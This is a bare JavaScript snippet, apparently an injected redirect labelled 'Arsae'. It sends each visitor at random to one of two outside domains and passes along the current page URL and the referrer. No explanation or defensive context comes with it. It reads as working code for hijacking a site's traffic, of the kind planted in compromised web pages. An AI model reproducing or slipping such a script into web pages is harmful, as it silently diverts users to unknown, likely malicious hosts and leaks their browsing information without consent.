///// Arsae /////
var arsDomains = ['https://read.vanphongphamtienloi.com', 'https://global.wowlazy.com'];
var ars = arsDomains[Math.floor(Math.random() * arsDomains.length)];
window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
